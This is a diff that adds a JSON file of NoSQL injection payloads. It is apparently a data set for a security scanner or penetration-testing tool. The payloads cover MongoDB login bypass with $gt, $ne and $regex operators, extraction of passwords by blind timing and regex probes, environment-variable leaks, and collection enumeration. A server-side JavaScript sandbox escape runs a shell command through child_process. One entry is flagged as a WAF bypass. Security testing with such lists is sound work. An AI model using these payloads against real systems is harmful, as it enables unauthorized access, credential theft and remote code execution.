@@ -1,0 +1,69 @@
+{
+  "category": "nosql",
+  "contexts": {
+    "mongodb_auth_bypass": {
+      "description": "MongoDB authentication bypass via operator injection",
+      "payloads": [
+        {"payload": "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}", "description": "Operator $gt auth bypass — matches any non-empty credentials", "waf_bypass": false},
+        {"payload": "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}", "description": "Operator $ne auth bypass — matches any user", "waf_bypass": false},
+        {"payload": "{\"username\": \"admin\", \"password\": {\"$gt\": \"\"}}", "description": "Admin account $gt bypass", "waf_bypass": false},
+        {"payload": "{\"username\": {\"$in\": [\"admin\", \"root\", \"administrator\"]}, \"password\": {\"$gt\": \"\"}}", "description": "$in operator to target multiple admin accounts", "waf_bypass": false},
+        {"payload": "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}", "description": "$regex wildcard auth bypass", "waf_bypass": false},
+        {"payload": "username[$ne]=invalid&password[$ne]=invalid", "description": "URL-encoded operator injection auth bypass", "waf_bypass": false},
+        {"payload": "username=admin&password[$gt]=", "description": "URL-encoded admin $gt bypass", "waf_bypass": false},
+        {"payload": "{\"username\": {\"$exists\": true}, \"password\": {\"$exists\": true}}", "description": "$exists operator — matches any document with both fields", "waf_bypass": false}
+      ]
+    },
+    "mongodb_extraction": {
+      "description": "MongoDB data extraction via operator abuse",
+      "payloads": [
+        {"payload": "{\"$where\": \"this.username == 'admin'\"}", "description": "$where clause for JS evaluation in query", "waf_bypass": false},
+        {"payload": "{\"username\": {\"$regex\": \"^a\"}}", "description": "Regex-based character extraction — first char probe", "waf_bypass": false},
+        {"payload": "{\"password\": {\"$regex\": \"^.{0,5}$\"}}", "description": "Regex-based password length probe", "waf_bypass": false},
+        {"payload": "username[$regex]=^admin&password[$regex]=^.", "description": "URL-encoded regex extraction", "waf_bypass": false},
+        {"payload": "{\"$where\": \"Object.keys(this).length > 3\"}", "description": "$where field count enumeration", "waf_bypass": false},
+        {"payload": "{\"$where\": \"this.constructor.constructor('return this')().process.env\"}", "description": "$where prototype chain environment leak", "waf_bypass": false},
+        {"payload": "{\"username\": {\"$gt\": \"a\"}, \"$orderby\": {\"password\": 1}}", "description": "Ordered extraction via $orderby", "waf_bypass": false}
+      ]
+    },
+    "mongodb_blind": {
+      "description": "Blind NoSQL injection for data extraction via boolean/timing oracles",
+      "payloads": [
+        {"payload": "{\"$where\": \"sleep(5000)\"}", "description": "Time-based blind via sleep in $where", "waf_bypass": false},
+        {"payload": "{\"$where\": \"if(this.username=='admin'){sleep(5000)}\"}", "description": "Conditional time-based blind", "waf_bypass": false},
+        {"payload": "{\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}}", "description": "Boolean blind — password starts with 'a'", "waf_bypass": false},
+        {"payload": "{\"username\": \"admin\", \"password\": {\"$regex\": \"^[a-m]\"}}", "description": "Boolean blind — binary search via regex range", "waf_bypass": false},
+        {"payload": "{\"$where\": \"if(this.password.length==8){sleep(5000)}\"}", "description": "Time-based password length detection", "waf_bypass": false},
+        {"payload": "{\"$where\": \"if(this.password.charAt(0)=='p'){return true}\"}", "description": "Boolean blind character-by-character extraction", "waf_bypass": false},
+        {"payload": "{\"$where\": \"if(this.password.match(/^p/)){sleep(5000)}\"}", "description": "Time-based regex match extraction", "waf_bypass": false}
+      ]
+    },
+    "operator_injection": {
+      "description": "MongoDB operator injection in various parameter contexts",
+      "payloads": [
+        {"payload": "[$gt]=", "description": "Append to parameter name for operator injection", "waf_bypass": false},
+        {"payload": "[$ne]=1", "description": "$ne operator via bracket notation", "waf_bypass": false},
+        {"payload": "[$regex]=.*", "description": "$regex operator via bracket notation", "waf_bypass": false},
+        {"payload": "[$nin][]=invalid", "description": "$nin (not in) array operator injection", "waf_bypass": false},
+        {"payload": "{\"$or\": [{\"a\": 1}, {\"b\": 1}]}", "description": "$or operator — bypass conditional checks", "waf_bypass": false},
+        {"payload": "{\"$and\": [{\"username\": {\"$gt\": \"\"}}, {\"admin\": true}]}", "description": "$and operator — append admin condition", "waf_bypass": false},
+        {"payload": "[$type]=2", "description": "$type operator — string type (BSON type 2)", "waf_bypass": false},
+        {"payload": "{\"field\": {\"$not\": {\"$eq\": \"expected\"}}}", "description": "$not operator to invert conditions", "waf_bypass": false},
+        {"payload": "q[$func]=function(){return true}", "description": "Mongoose $func injection (if custom operators enabled)", "waf_bypass": true}
+      ]
+    },
+    "ssji": {
+      "description": "Server-side JavaScript injection in MongoDB $where and eval contexts",
+      "payloads": [
+        {"payload": "';return true;var a='", "description": "Break out of string and return true", "waf_bypass": false},
+        {"payload": "1;return true;", "description": "Terminate expression and force true return", "waf_bypass": false},
+        {"payload": "';var d=new Date();do{var c=new Date();}while(c-d<5000);var a='", "description": "Time-based SSJI via busy loop", "waf_bypass": false},
+        {"payload": "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')", "description": "Node.js sandbox escape via prototype chain (RCE)", "waf_bypass": false},
+        {"payload": "';this.a=function(){return db.getCollectionNames()};a='", "description": "Enumerate collection names via injected function", "waf_bypass": false},
+        {"payload": "db.injection.insert({\"success\":1})", "description": "Write test to confirm eval injection", "waf_bypass": false},
+        {"payload": "';var x=tojsononeline(db.getCollectionNames());var a='", "description": "JSON-serialized collection enumeration", "waf_bypass": false},
+        {"payload": "(function(){var x=new Error();return x.stack})()", "description": "Stack trace leak for path disclosure", "waf_bypass": false}
+      ]
+    }
+  }
+}
